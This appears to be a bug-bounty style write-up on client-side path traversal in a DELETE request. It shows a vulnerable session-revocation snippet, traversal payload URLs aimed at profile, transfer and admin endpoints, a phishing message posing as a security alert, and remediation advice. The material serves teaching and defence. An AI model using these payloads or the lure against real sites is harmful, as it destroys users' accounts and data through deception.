Client-Side Path Traversal in DELETE Requests: Deleting Arbitrary Accounts

Based on Deepstrike research · Unsanitized input in destructive API calls

Vulnerability

A session management page constructs a DELETE fetch request using a sessionId parameter taken directly from user input. No sanitization is applied before the value is interpolated into the URL path. By injecting path traversal sequences (../), an attacker can redirect the DELETE request to any API endpoint — including account deletion, fund transfers, or admin operations.

The Vulnerable Pattern

The application's session revocation feature builds the API URL using string concatenation:

// Session management page JavaScript
if (userConfirmed) {
  fetch(`/api/users/sessions/${sessionId}`, {
    method: "DELETE",
    credentials: "include",
    headers: {
      "Content-Type": "application/json",
    },
  })
  .then(async (res) => {
    if (res.ok) {
      alert("Session deleted successfully!");
    }
  })
}

The critical flaw: sessionId is interpolated directly into the request path without any filtering or validation. If sessionId comes from a URL parameter, the attacker controls the path.

The Attack

Normal Request

// User clicks "Revoke" on session sess_a1b2c3
DELETE /api/users/sessions/sess_a1b2c3 HTTP/1.1
// Result: Session revoked ✓

Malicious Request

// Attacker crafts URL: ?session=../profile
// sessionId = "../profile"
DELETE /api/users/sessions/../profile HTTP/1.1

// Server resolves path to:
DELETE /api/users/profile HTTP/1.1
// Result: USER ACCOUNT DELETED!

Escalation: Reaching Other Endpoints

// Delete another user's data:
?session=../../other-user/sessions/all
// DELETE /api/users/sessions/../../other-user/sessions/all
// → DELETE /api/other-user/sessions/all

// Hit the transfer endpoint:
?session=../../transfer?to=attacker&amount=10000
// DELETE /api/users/sessions/../../transfer?to=attacker&amount=10000

// Admin operations:
?session=../../../admin/users/victim
// DELETE /api/users/sessions/../../../admin/users/victim
// → DELETE /admin/users/victim

Why DELETE is Especially Dangerous

Most CSPT research focuses on GET and POST requests. But DELETE-based CSPT is often more impactful because:

• DELETE operations are inherently destructive and often irreversible

• Developers assume DELETE endpoints are "safe" because they require authentication

• Many APIs have DELETE endpoints for accounts, data, subscriptions, and resources

• A single malicious link can permanently destroy a user's account or data

Why Server-Side Validation Isn't Enough

The developer might argue "our server validates the session ID." But the path traversal happens before the server sees the session ID:

// What the developer expects:
// Client sends: DELETE /api/users/sessions/[valid-session-id]
// Server checks: does this session belong to the authenticated user?

// What actually happens with CSPT:
// Client sends: DELETE /api/users/profile
// Server receives a DELETE request to /api/users/profile
// Server never sees a session ID - it's a completely different endpoint!
// The session validation code never runs.

The Social Engineering Vector

The attacker doesn't need to trick the user into pasting a payload. They craft a link that looks legitimate:

// Attacker sends to victim (looks like a security alert):
https://app.target.com/security/sessions?session=../profile

// Or via an email:
"We detected suspicious activity on your account.
 Please review and revoke the following session:
 https://app.target.com/security/sessions?session=../profile"

// Victim clicks "Revoke" on the page → their account is deleted

Attack Flow

1

Attacker crafts malicious URL: /sessions?session=../profile

↓
2

Sends link to victim via email/chat disguised as a security alert

↓
3

Victim opens the page — sees their sessions listed normally

↓
4

Victim clicks "Revoke" on any session — the ?session URL param overrides the session ID

↓
5

JavaScript sends DELETE /api/users/sessions/../profile instead of the real session ID

↓
6

Server resolves path and executes DELETE /api/users/profile — account permanently deleted

Bug Bounty Tip

When hunting for CSPT, don't just look at GET and POST — specifically target DELETE, PUT, and PATCH requests. Search the JavaScript for:

• fetch( or XMLHttpRequest with method: "DELETE"

• Template literals or string concatenation building the URL

• URL parameters, hash values, or postMessage data flowing into the path

Then test with ../ to see if you can reach other endpoints. The most impactful CSPT targets destructive operations — DELETE account, revoke access, cancel subscription.

Remediation

  • Client-side: Validate that path parameters contain only expected characters (alphanumeric, hyphens). Reject any value containing ., /, or \
  • Client-side: Never use URL parameters to override server-provided data. The session IDs should only come from the API response, not the URL
  • Server-side: Normalize request paths before routing — resolve ../ sequences and reject requests that traverse outside expected paths
  • Server-side: Verify that the resource being deleted belongs to the authenticated user at the endpoint level, not just at the router level
  • Architectural: Use request body parameters (not URL paths) for resource identifiers in destructive operations
